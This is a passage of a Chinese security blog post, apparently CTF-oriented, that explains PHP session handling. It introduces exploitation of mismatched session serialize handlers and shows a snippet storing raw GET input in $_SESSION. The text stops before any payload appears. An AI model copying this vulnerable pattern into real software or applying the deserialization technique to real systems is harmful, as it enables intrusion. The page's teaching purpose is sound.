<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Cookie&amp;Session&amp;Token - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='通用, 网络' />
  <meta itemprop="name" content="Cookie&Session&Token">
  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="wordCount" content="723">
  <meta itemprop="keywords" content="通用,网络"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E9%80%9A%E7%94%A8/%E7%BD%91%E7%BB%9C/33/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="Cookie&Session&Token">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:tag" content="通用">
    <meta property="article:tag" content="网络">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Cookie&Session&Token">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E9%80%9A%E7%94%A8/%E7%BD%91%E7%BB%9C/33/" /><link rel="prev" href="https://dongyu29.github.io/posts/owasp/xss/126/" /><link rel="next" href="https://dongyu29.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%BC%80%E5%8F%91/75/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "Cookie\u0026Session\u0026Token",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E9%80%9A%E7%94%A8\/%E7%BD%91%E7%BB%9C\/33\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "通用, 网络","wordcount":  723 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E9%80%9A%E7%94%A8\/%E7%BD%91%E7%BB%9C\/33\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ></a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Cookie&amp;Session&amp;Token</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Cookie&amp;Session&amp;Token</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E9%80%9A%E7%94%A8/" class="post-category" title="Category - 通用"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 通用</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="723 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#oauth">OAuth</a></li>
  </ul>

  <ul>
    <li><a href="#工作流程">工作流程</a></li>
    <li><a href="#trick">trick</a></li>
    <li><a href="#利用1session反序列化">利用1：session反序列化</a></li>
    <li><a href="#利用2session伪造">利用2：session伪造</a></li>
    <li><a href="#利用3session包含">利用3：session包含</a></li>
  </ul>

  <ul>
    <li><a href="#jwt">jwt</a>
      <ul>
        <li><a href="#利用1修改加密算法">利用1：修改加密算法</a></li>
        <li><a href="#利用2爆破密钥">利用2：爆破密钥</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="前言" class="heading-element"><span>前言</span>
  <a href="#%e5%89%8d%e8%a8%80" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>我是这么理解的，由于http是无状态的，需要cookie存储一些信息，相当与你去银行办业务说出你的姓名、电话、身份证号等，在web交互中这个过程相当于浏览器向服务器提交cookie，但是我能不能在银行办业务的时候说别人的姓名、电话呢？如果银行没有相应手段证伪的话大概是可以的，也就是你可以伪装成别人，给别人办卡，或者取走别人的钱。所以就需要银行也储存一些信息来确认，类似让你做人脸识别，最后身份证、户口本相当于token，他们是有加密和难以伪造的（除非你偷走别人的户口本，并且通过了银行的再验证）</p>
<h1 id="cookie" class="heading-element"><span>COOKIE</span>
  <a href="#cookie" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h2 id="oauth" class="heading-element"><span>OAuth</span>
  <a href="#oauth" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h1 id="session" class="heading-element"><span>session</span>
  <a href="#session" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>参考https://xz.aliyun.com/t/6640</p>
<h2 id="工作流程" class="heading-element"><span>工作流程</span>
  <a href="#%e5%b7%a5%e4%bd%9c%e6%b5%81%e7%a8%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p>工作流程</p>
<p>（1）首先使用==session_start()==函数进行初始化，启动会话</p>
<pre tabindex="0"><code>- 读取名为PHPSESSID（默认）的cookie值，假使为abc123

- 若读取到PHPSESSID这个COOKIE，创建$_SESSION变量，并从相应的目录中（可以再php.ini中设置）读取SESS_abc123（默认是这  

种命名方式）文件,将字符装在入$_SESSION变量中;

- 如果发现请求的Cookie、Get、Post中不存在session id，PHP就会自动调用php_session_create_id函数创建一个新的会话，并且在

http response中通过set-cookie头部发送给客户端保存，（有时候浏览器用户设置会禁止 cookie，当在客户端cookie被禁用的情况下，php也可以自动将session id添加到url参数中以及form的hidden字段中，但这需要将php.ini中的session.use_trans_sid设为开启，也可以在运行时调用ini_set来设置这个配置项。）

也会创建$_SESSION变量，同时创建一个sess_abc321(名称为随机值)的session文件,同时将abc321作为PHPSESSID的cookie值返回给浏览器

端。</code></pre><p>（2）当执行PHP脚本时，通过使用$_SESSION变量注册session文件。
（3）当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中， 这个路径可以通过php.ini文件中的==session.save_path==指定，下次浏览网页时可以加载使用。</p>
</blockquote>
<hr>
<p><code>抓包</code></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">error_reporting</span>(<span style="color:#a6be9d">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ini_set</span>(<span style="color:#a6be9d">&#39;session.serialize_handler&#39;</span>,<span style="color:#a6be9d">&#39;php_serialize&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_SESSION</span>[<span style="color:#a6be9d">&#39;session&#39;</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;session&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161530950.png" alt="image-20230316153025770" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161530950.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161530950.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161530950.png?size=large 2x" data-title="image-20230316153025770" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>可以看到新生成的sess存储文件</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161531286.png" alt="image-20230316153145240" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161531286.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161531286.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161531286.png?size=large 2x" data-title="image-20230316153145240" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>第二次再发包cookie里就带PHPSESSID了</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161535147.png" alt="image-20230316153537084" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161535147.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161535147.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161535147.png?size=large 2x" data-title="image-20230316153537084" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161536446.png" alt="image-20230316153635404" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161536446.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161536446.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161536446.png?size=large 2x" data-title="image-20230316153635404" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<hr>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161118827.png" alt="image-20230316111814787" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161118827.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161118827.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161118827.png?size=large 2x" data-title="image-20230316111814787" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>可以看到session是==序列化存储==的，之前做过session反序列化的题</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161116337.png" alt="image-20230316111623248" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161116337.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161116337.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161116337.png?size=large 2x" data-title="image-20230316111623248" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="trick" class="heading-element"><span>trick</span>
  <a href="#trick" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>在PHP配置中的默认情况下，Session是用==Session ID==来确定当前对话所对应的服务器Session，而Session ID是通过Cookie来传递的，禁用Cookie相当于失去了Session ID，也就得不到Session了</li>
</ul>
<h2 id="利用1session反序列化" class="heading-element"><span>利用1：session反序列化</span>
  <a href="#%e5%88%a9%e7%94%a81session%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p>选择不同的处理器，处理方式也不一样，如果序列化和储存session与反序列化的方式不同，就有可能导致漏洞的产生。</p>
<p><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md</a></p>
<p>我之前一直不理解session是怎么影响到当前php脚本的，现在懂了一些，==当 PHP 停止的时候，它会自动读取 内存中<code>$_SESSION</code> 中的内容，并将其进行<code>序列化</code>， 然后发送给会话保存管理器来进行保存（持久化存储在硬盘上）。==也就是session被序列化的时候，那我猜session进行反序列化的时候就是用户传过来sessid并且确实存在这个会话id的时候，这个时候硬盘中的sess_文件内容会被反序列化取出到内存中，那么这里也能看出来==用户越多的时候对服务器的内存压力是越大的==。</p>
<p>那么这个漏洞的利用过程大概是：</p>
<p>一、题目ini配置满足session内容的自定义上传 ，上传过程中存储在$_SESSION,结束后根据==php.ini中规定的处理器==进行持久化存储（因为当前并没有执行这个题目的php脚本）</p>
<p>二、存在session序列化处理器不同的漏洞 ，发起会话读取这个题目的页面时，session会被从sess_文件中读取并根据==当前php脚本中ini_set规定的处理器==进行反序列化，这个时候正在被反序列化的字符串（我们构造的payload）刚好与当前执行的php脚本契合，那这个session存储的序列化内容就被反序列化执行了</p>
</blockquote>
<p>默认情况下，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置。</p>
<p>PHP session在php.ini中有很多配置项，<code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的，当然这个文件名也不是不变的</p>
<hr>
<p><code>session.serialize_handler</code>定义的引擎有三种，如下表所示：</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody>
<tr>
<td>php</td>
<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>php</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">error_reporting</span>(<span style="color:#a6be9d">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ini_set</span>(<span style="color:#a6be9d">&#39;session.serialize_handler&#39;</span>,<span style="color:#a6be9d">&#39;php&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_SESSION</span>[<span style="color:#a6be9d">&#39;session&#39;</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;session&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
